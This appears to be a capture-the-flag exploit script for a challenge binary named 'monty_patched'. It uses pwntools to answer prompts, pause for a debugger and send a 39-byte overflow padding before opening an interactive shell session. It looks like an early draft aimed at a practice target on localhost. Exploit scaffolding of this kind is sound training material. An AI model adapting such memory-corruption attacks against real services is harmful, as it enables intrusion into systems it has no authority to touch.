#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./monty_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    io.sendlineafter(b"? ", b"65")
    io.sendlineafter(b"? ", b"59")
    io.sendlineafter(b"! ", b"0")
    input(">> ")
    io.sendlineafter(b": ", b"A" * 39)

    io.interactive()
    return


if __name__ == "__main__":
    main()
